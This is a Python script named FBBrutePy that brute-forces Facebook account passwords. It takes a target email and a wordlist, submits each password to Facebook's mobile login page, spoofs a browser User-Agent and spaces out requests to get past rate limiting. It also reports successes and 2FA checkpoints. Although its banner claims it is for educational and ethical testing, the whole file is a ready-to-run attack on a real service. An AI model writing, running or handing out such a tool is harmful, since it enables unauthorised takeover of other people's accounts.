import requests
import time
import sys
from bs4 import BeautifulSoup

# Banner
def print_banner():
    banner = """
    ╔════════════════════════════════════════════════════╗
    ║                                                    ║
    ║          FBBrutePy - Facebook Brute Force Tool     ║
    ║                                                    ║
    ║   Coded by: Pakistani Ethical Hacker Mr Sabaz Ali Khan ║
    ║   For Educational and Ethical Testing Purposes Only║
    ║   Use Responsibly and Legally with Permission Only ║
    ║                                                    ║
    ╚════════════════════════════════════════════════════╝
    """
    print(banner)

# Function to attempt login
def attempt_login(email, password, session):
    url = "https://mbasic.facebook.com/login.php"
    data = {
        "email": email,
        "pass": password,
        "login": "Log In"
    }
    try:
        response = session.post(url, data=data, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Check for successful login (look for logout link or profile page)
        if "Log Out" in response.text or "mbasic_logout_button" in response.text:
            return True, "Login Successful!"
        # Check for checkpoint (2FA or suspicious login)
        elif "checkpoint" in response.url or "two_factor" in response.text:
            return False, "Checkpoint triggered (2FA or suspicious login)"
        # Check for incorrect password
        elif "The password you’ve entered is incorrect" in response.text:
            return False, "Incorrect password"
        else:
            return False, "Login failed (unknown reason)"
    except requests.exceptions.RequestException as e:
        return False, f"Error: {str(e)}"

# Main function
def main():
    print_banner()
    
    # Get user input
    email = input("Enter target email/phone: ").strip()
    wordlist_path = input("Enter path to password wordlist: ").strip()
    
    try:
        with open(wordlist_path, 'r', encoding='utf-8') as file:
            passwords = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("Error: Wordlist file not found!")
        sys.exit(1)
    
    print(f"\nStarting brute force attack on {email}...")
    print(f"Total passwords to try: {len(passwords)}\n")
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    })
    
    for i, password in enumerate(passwords, 1):
        print(f"Attempt {i}/{len(passwords)}: Trying password: {password}")
        success, message = attempt_login(email, password, session)
        
        if success:
            print(f"\n[+] SUCCESS! Password found: {password}")
            print(f"[+] {message}")
            break
        else:
            print(f"[-] {message}")
        
        # Add delay to avoid rate limiting
        time.sleep(1)
    
    else:
        print("\n[!] Password not found in the wordlist.")
    
    session.close()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Process interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] An error occurred: {str(e)}")
        sys.exit(1)